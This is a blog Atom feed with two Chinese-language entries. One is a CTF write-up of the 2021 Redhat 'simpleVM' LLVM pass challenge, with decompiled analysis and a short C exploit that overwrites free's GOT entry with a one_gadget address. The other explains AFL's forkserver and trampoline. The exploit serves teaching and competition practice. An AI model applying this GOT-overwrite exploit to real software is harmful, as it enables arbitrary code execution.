<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Squirre17 Blog</title>
  
  <subtitle>Sakana~</subtitle>
  <link href="https://squirre17.github.io/atom.xml" rel="self"/>
  
  <link href="https://squirre17.github.io/"/>
  <updated>2022-11-08T11:27:20.290Z</updated>
  <id>https://squirre17.github.io/</id>
  
  <author>
    <name>Squirre17</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021 redhat simpleVM</title>
    <link href="https://squirre17.github.io/2022/11/08/2021-redhat-simpleVM/"/>
    <id>https://squirre17.github.io/2022/11/08/2021-redhat-simpleVM/</id>
    <published>2022-11-08T11:09:36.000Z</published>
    <updated>2022-11-08T11:27:20.290Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/fghcvjk/2021redhat">GitHub - fghcvjk/2021redhat: 第四届 “红帽杯” 网络安全大赛 - 初赛</a></p><p>对于 llvm pwn<br> 需要三个组件 一个是 opt 用于将一个对 ir 操作的规则 so 加载到一个 lr or bc 文件里。从而完成 ir 层面的处理。</p><p>而这里已经给了 opt 与 so 我们要写的就是 bc 去利用这个 opt。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/squ/prac/pwn/opt-8&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO      X</span><br><span class="line">    Stack:    No canary found    X</span><br><span class="line">    NX:       NX enabled         √</span><br><span class="line">    PIE:      No PIE (0x400000)  X</span><br></pre></td></tr></table></figure><h1 id="pass练习"><a class="markdownIt-Anchor" href="#pass练习">#</a> pass 练习</h1><p>假设我要找到一个函数的所有调用</p><ul><li>拿到一个 function</li><li>遍历所有 BasicBlock</li><li>遍历 BB 中的所有 instruction</li><li>根据 instruction 构造一个 CallBase 也就是这个 instruction 是存在调用的 (如果 dyn_cast 不出来就跳过 说明不是 call)</li><li>getNumOperands 可以得到所有操作数 记住 这里和 ghidra 一样 第一个 Operand 是函数地址</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span> = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str)</span><br></pre></td></tr></table></figure><ul><li>然后通过 getArgOperand cast 到 ConstantInt 再 getZExtValue 就能得到操作数的值 同样的 会有错误情况，比如是一个字符串不是数字 需要 continue</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/InstrTypes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Constants.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace llvm;</span><br><span class="line">using <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">using <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">using <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="comment">/* anonymous namespace. visible only to the current file. */</span></span><br><span class="line">namespace &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Squ</span> :</span> public FunctionPass &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">  Squ() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  which overrides an abstract virtual method inherited from FunctionPass. */</span></span><br><span class="line">  <span class="type">bool</span> <span class="title function_">runOnFunction</span><span class="params">(Function &amp;F)</span> override &#123;</span><br><span class="line">    <span class="comment">/* print the function name */</span></span><br><span class="line">    errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="comment">/* BasicBlock iterator */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;BB_i : F)&#123;</span><br><span class="line">        <span class="comment">/* Istruction iterator */</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;I_i : BB_i)&#123;</span><br><span class="line">            Value *CalledFunction;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">auto</span> *CB = dyn_cast&lt;CallBase&gt;(&amp;I_i))&#123;</span><br><span class="line">                CalledFunction = CB-&gt;getCalledFunction();</span><br><span class="line">                StringRef Name = CalledFunction-&gt;getName();</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> num = CB-&gt;getNumOperands();</span><br><span class="line"></span><br><span class="line">                errs() &lt;&lt; <span class="string">&quot;\tCall : &quot;</span> &lt;&lt; Name &lt;&lt; <span class="string">&quot; with &quot;</span> \</span><br><span class="line">                    &lt;&lt; num &lt;&lt; <span class="string">&quot; argus&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; i++)&#123;</span><br><span class="line">                    ConstantInt *ci = dyn_cast&lt;ConstantInt&gt;(CB-&gt;getArgOperand(i));</span><br><span class="line">                    <span class="comment">// assert(ci != NULL);</span></span><br><span class="line">                    <span class="keyword">if</span>(ci == <span class="literal">NULL</span>) <span class="keyword">continue</span>; <span class="comment">// not a digital</span></span><br><span class="line">                    errs() &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; ci-&gt;getZExtValue();</span><br><span class="line">                &#125;</span><br><span class="line">                errs() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// end of struct Squ</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* LLVM uses ID’s address to identify a pass */</span></span><br><span class="line"><span class="type">char</span> Squ::ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* important here for cmd-line use */</span></span><br><span class="line"><span class="type">static</span> RegisterPass&lt;Squ&gt; <span class="title function_">X</span><span class="params">(<span class="string">&quot;squ&quot;</span>, <span class="string">&quot;squ Pass&quot;</span>,</span></span><br><span class="line"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span><br><span class="line"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> RegisterStandardPasses <span class="title function_">Y</span><span class="params">(</span></span><br><span class="line"><span class="params">    PassManagerBuilder::EP_EarlyAsPossible,</span></span><br><span class="line"><span class="params">    [](<span class="type">const</span> PassManagerBuilder &amp;Builder,</span></span><br><span class="line"><span class="params">       legacy::PassManagerBase &amp;PM) &#123; PM.add(new Squ()); &#125;)</span>;</span><br></pre></td></tr></table></figure><h1 id="分析"><a class="markdownIt-Anchor" href="#分析">#</a> 分析</h1><p>不过首先先分析他的 IR 规则 找到 start 这就是 ir 对象的注册点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  sub_6510((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到虚表 (Pass 类)<br><img src="/2022/11/08/2021-redhat-simpleVM/simpleVM_vtable.png" alt></p><p>这个 6830 就是 runOnFunction</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::getName(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    trigger(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>断点在 Name 后可以看到  <code>llvm::Value::getName</code>  获得的是函数名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/s <span class="variable">$rax</span></span></span><br><span class="line">0x8241f0:       &quot;function1&quot;</span><br></pre></td></tr></table></figure><p>也就是我们函数名要为 <code>o0o0o0o0</code>  才能进入</p><p>然后跟入 此处有明显的迭代器痕迹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">trigger</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::begin(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::end(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::operator!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="comment">/* 迭代器解引用 */</span></span><br><span class="line">    iter = llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator*(v5);</span><br><span class="line">    sub_6B80(a1, iter, <span class="number">1LL</span>);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::operator++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>llvm::CallBase::getCalledFunction : Returns the function called</li></ul><p>对每个函数遍历后会在 sub_6B80 中对基本块遍历<br>从基本块中获取每一个指令 然后 getOpcode (比如 call store)<br> 取出调用的函数名 比如 <code>add(1,2)</code>  这里就取出 add</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v38 = llvm::BasicBlock::end(a2);</span><br><span class="line">  <span class="keyword">if</span> ( (llvm::operator!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;((__int64)v39);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v36) == <span class="string">&#x27;7&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">    <span class="keyword">if</span> ( v35 )</span><br><span class="line">    &#123;</span><br><span class="line">      s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">      CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">      Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">      *(_QWORD *)s1 = *Name;</span><br><span class="line">      *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">      *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">      *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>然后就是虚拟机程序了 根据调用的函数来进行虚拟机执行</p><ul><li>REG_x 分别是 LOAD 段上的两个地址</li><li>这里会先用 llvm::CallBase::getNumOperands 判断有几个参数</li><li>llvm::CallBase::getArgOperand (v35, 0) 然后获得第一个参数 (是类方法，所以 rdi 是自己的地址，第二个是参数的 idx)</li><li>llvm::dyn_cast 对象调用 llvm::ConstantInt::getZExtValue 就是是获得这个值的 0 拓展 GDB 验证了一下</li><li>然后根据第一个参数是 0 是 1 对 REG_x 中存放的地址处写入别的 REG 中的内容</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">    v24 = <span class="number">0LL</span>;</span><br><span class="line">    v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">        v24 = REG_1;</span><br><span class="line">      <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">        v24 = REG_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v24 == REG_1 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)REG_1 = *(_QWORD *)REG_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == REG_2 )</span><br><span class="line">    &#123;</span><br><span class="line">      **(_QWORD **)REG_2 = *(_QWORD *)REG_1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下的分析也都大同小异</p><ul><li>reg1 中给到 free_got 的值 (free 就在后面结束被调用)</li><li>free_got 里的内容写给 reg2</li><li>reg2 加上偏移得到 one_gadget</li><li>one_gadget store 回 free_got</li></ul><p>由于我懒得换到小版本的 libc 了，所以就最后验证了一下写回<br><img src="/2022/11/08/2021-redhat-simpleVM/result.png" alt></p><h1 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_GOT 0x77e100</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, FREE_GOT);   <span class="comment">// REG_1            = FREE_GOT</span></span><br><span class="line">    load(<span class="number">1</span>);            <span class="comment">// REG_2            = content of FREE_GOT</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x49434</span>);    <span class="comment">// REG_2           += offset</span></span><br><span class="line">    store(<span class="number">1</span>);           <span class="comment">// content of REG_1 = REG_2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    o0o0o0o0();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/fghcvjk/2021redhat&quot;&gt;GitHub - fghcvjk/2021redhat: 第四届 “红帽杯” 网络安全大赛 - 初赛&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对于 llvm pwn&lt;br&gt;
 需要三个组件 一个是</summary>
      
    
    
    
    <category term="CTF" scheme="https://squirre17.github.io/categories/CTF/"/>
    
    
    <category term="llvm" scheme="https://squirre17.github.io/tags/llvm/"/>
    
    <category term="pwn" scheme="https://squirre17.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>afl-forkserver-maneuver</title>
    <link href="https://squirre17.github.io/2022/11/03/afl-forkserver-maneuver/"/>
    <id>https://squirre17.github.io/2022/11/03/afl-forkserver-maneuver/</id>
    <published>2022-11-03T11:12:15.000Z</published>
    <updated>2022-11-03T11:20:43.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="forkserver的目的"><a class="markdownIt-Anchor" href="#forkserver的目的">#</a> forkserver 的目的</h1><p>参见 <a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">lcamtuf.blogspot</a><br> 如果每次由 fuzzer 来进行 fork-execve 那么每次目标程序都得进装载器链接器和动态加载库打一套 十分浪费时间。<br>但是 如果我们劫持了目标程序的_start 让目标程序一开始执行我们写入的 forkserver 代码，这样就能在装载之后通过 COW 实现低成本的 fork。<br>也就是 forkserver 本身就注入到目标程序里面去了，作为目标程序的起始点不断的进行 fork。<br><img src="/2022/11/03/afl-forkserver-maneuver/mechanism.png" alt></p><h1 id="trampoline"><a class="markdownIt-Anchor" href="#trampoline">#</a> trampoline</h1><p>这个被插桩到每个基本块之前</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><ol><li>将当前 rsp 下降 (128+24)</li><li>rdx rcx rax 分别保存在 rsp 上面一丢丢</li><li>将 <code>R(MAP_SIZE)</code>  这个随机数 (0-65535) 给到 rcx 调用__afl_maybe_log (这个随机数是基本块标号，编译时确定)</li></ol><h1 id="main_payload_64"><a class="markdownIt-Anchor" href="#main_payload_64">#</a> main_payload_64</h1><p>这个主要是注入大量函数逻辑</p><h2 id="__afl_maybe_log"><a class="markdownIt-Anchor" href="#__afl_maybe_log">#</a> __afl_maybe_log</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;__afl_maybe_log:\n&quot;</span><br><span class="line">&quot;  lahf\n&quot;</span><br><span class="line">&quot;  seto  %al\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span><br><span class="line">&quot;  testq %rdx, %rdx\n&quot;</span><br><span class="line">&quot;  je    __afl_setup\n&quot;</span><br><span class="line">&quot;__afl_store:\n&quot;</span><br></pre></td></tr></table></figure><ul><li>lahf : load to ah from eflags</li><li>seto : set to 1 if target byte overflow</li><li>如果 <code>__afl_area_ptr</code>  里没有东西 就跳转到 <code>__afl_setup</code> 